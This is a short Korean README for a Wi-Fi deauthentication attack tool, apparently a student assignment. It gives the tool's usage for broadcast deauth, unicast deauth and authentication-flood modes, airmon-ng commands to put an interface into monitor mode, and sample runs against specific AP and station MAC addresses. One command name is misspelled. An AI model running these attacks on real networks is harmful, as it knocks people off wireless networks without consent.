# Deauth Attack
### 802.11 Wireless LAN 환경에서 Deauth Attack을 수행하는 프로그램
- WAP2 환경에서 동작합니다.
- Auth, Unicast Deauth, Broadcast Deauth 3가지 모드가 있습니다.

## Usage
- syntax : deauth-attack [interface] [ap mac] [[station mac] [-auth]]
- sample : deauth-attack mon0 00:11:22:33:44:55 66:77:88:99:AA:BB
  - [ap mac]까지만 명시되는 경우에는 AP broadcast frame을 발생
  - [station mac]까지 명시되는 경우에는 AP unicast, Station unicast frame을 발생
  - -auth 옵션이 주어지면 deauthentication이 아닌 authentication으로 공격

## Before Execute
```
sudo ifconfig wlan0 down
sudo iwconfig wlan0 mode monitor
sudo airmon-ng check kill
sudo airodumpo-ng wlan0 채널 정보 및 BSSID 확인
sudo airmon-ng start wlan0 6
//sudo iwconfig wlan0 channel 6 #
//sudo ifconfig wlan0 up
```
## Sample
- ```sudo ./deauth-attack wlan0 00:0A:F5:E7:92:50```
- ```sudo ./deauth-attack wlan0 00:0A:F5:E7:92:50 9c:28:b3:f0:70:3d```
- ```sudo ./deauth-attack wlan0 00:0A:F5:E7:92:50 9c:28:b3:f0:70:3d -auth```

## Reference
[report deauth attack](https://gitlab.com/gilgil/sns/-/wikis/deauth-attack/report-deauth-attack)
